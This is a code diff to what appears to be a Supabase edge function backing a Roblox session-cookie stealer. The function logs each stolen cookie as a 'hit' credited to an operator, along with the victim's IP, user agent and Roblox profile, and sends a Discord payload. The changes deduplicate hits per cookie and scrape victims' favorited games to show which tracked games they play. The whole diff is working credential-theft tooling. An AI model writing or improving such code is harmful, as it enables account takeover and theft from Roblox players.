@@ -97,9 +97,9 @@ Deno.serve(async (req) => {
     const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || "Unknown";
     const userAgent = req.headers.get("user-agent") || "Unknown";
 
-    // 4. Log the hit
+    // 4. Log the hit (upsert — same cookie for same owner is deduped)
     if (profile) {
-      await supabase.from("hits").insert({
+      await supabase.from("hits").upsert({
         owner_id: profile.id,
         tool_type: body.toolType,
         roblox_username: robloxInfo?.name ?? null,
@@ -118,7 +118,7 @@ Deno.serve(async (req) => {
         cookie_preview: body.cookie.slice(-16),
         ip_address: ip,
         user_agent: userAgent,
-      });
+      }, { onConflict: "owner_id,cookie_preview" });
     }
 
     // 5. Discord payload
@@ -262,38 +262,37 @@ async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
   }
 }
 
-// Detects whether the user has played a tracked game by checking if they
-// own any badge from that game's universe. Most popular games award a
-// "welcome" / join badge, so this is a reliable proxy for "has played".
+// Detects whether the user has interacted with a tracked game.
+// Method: check the user's PUBLIC GAME FAVORITES for the universe ID.
+// This bypasses badges entirely (some games disable badges or hide them).
 async function fetchPlayedGames(userId: number): Promise<Array<{ name: string; played: boolean }>> {
-  return await Promise.all(
-    TRACKED_GAMES.map(async ({ name, placeId }) => {
-      try {
-        // Place ID → Universe ID (badges API requires universe IDs)
-        const universeId = await placeToUniverse(placeId);
-        if (!universeId) return { name, played: false };
-
-        // Get a handful of badges from the universe
-        const badgesRes = await fetch(
-          `https://badges.roblox.com/v1/universes/${universeId}/badges?limit=25&sortOrder=Asc`,
-        );
-        if (!badgesRes.ok) return { name, played: false };
-        const badgesJson = await badgesRes.json() as { data?: Array<{ id: number }> };
-        const badgeIds = (badgesJson.data ?? []).map((b) => b.id);
-        if (badgeIds.length === 0) return { name, played: false };
-
-        // Ask Roblox which of those badges the user has earned
-        const ownedRes = await fetch(
-          `https://badges.roblox.com/v1/users/${userId}/badges/awarded-dates?badgeIds=${badgeIds.join(",")}`,
-        );
-        if (!ownedRes.ok) return { name, played: false };
-        const ownedJson = await ownedRes.json() as { data?: Array<{ badgeId: number; awardedDate: string }> };
-        return { name, played: (ownedJson.data ?? []).length > 0 };
-      } catch {
-        return { name, played: false };
-      }
-    }),
+  // Resolve all tracked place IDs to universe IDs in parallel
+  const resolved = await Promise.all(
+    TRACKED_GAMES.map(async (g) => ({
+      ...g,
+      universeId: await placeToUniverse(g.placeId),
+    })),
   );
+
+  // Pull the user's full favorited-games list (paginated)
+  const favorites = new Set<number>();
+  try {
+    let cursor = "";
+    for (let page = 0; page < 5; page++) {
+      const url = `https://games.roblox.com/v2/users/${userId}/favorite/games?limit=50&sortOrder=Asc${cursor ? `&cursor=${cursor}` : ""}`;
+      const r = await fetch(url);
+      if (!r.ok) break;
+      const j = await r.json() as { data?: Array<{ id: number }>; nextPageCursor?: string };
+      for (const game of j.data ?? []) favorites.add(game.id);
+      if (!j.nextPageCursor) break;
+      cursor = j.nextPageCursor;
+    }
+  } catch { /* ignore */ }
+
+  return resolved.map(({ name, universeId }) => ({
+    name,
+    played: universeId !== null && favorites.has(universeId),
+  }));
 }
 
 async function fetchAvatar(userId: number): Promise<string | null> {
